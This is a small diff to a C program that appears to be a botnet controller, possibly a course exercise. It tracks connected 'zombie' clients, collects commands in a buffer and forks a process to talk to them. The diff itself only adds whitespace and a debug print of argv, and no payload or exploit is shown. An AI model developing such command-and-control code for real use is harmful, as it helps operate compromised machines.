@@ -17,7 +17,7 @@
 		#include "utils_v2.h"
 		#include "port.h"
 		#include "botNet.h"
-
+		
 		Zombie tabZombie[BACKLOG];
 		struct pollfd fds[10];
 		volatile sig_atomic_t numberOfZombie = 0;
@@ -31,13 +31,16 @@
 
 		int main(int argc, char *argv[])
 		{	
-	    	sigset_t set;
+	    	
+			printf("argv :  %s",*argv);
+			sigset_t set;
 	    	ssigemptyset(&set);
 	    	ssigaddset(&set,SIGPIPE);
 	    	ssigprocmask(SIG_BLOCK, &set, NULL);
 
 	    	ssigaction(SIGINT,done);
 			getPortIp(*argv,argc-1);
+
 			getConnectedZombie();
 			char tabCommande [BUFFERSIZE];
 			fork_and_run0(discussionProcess);
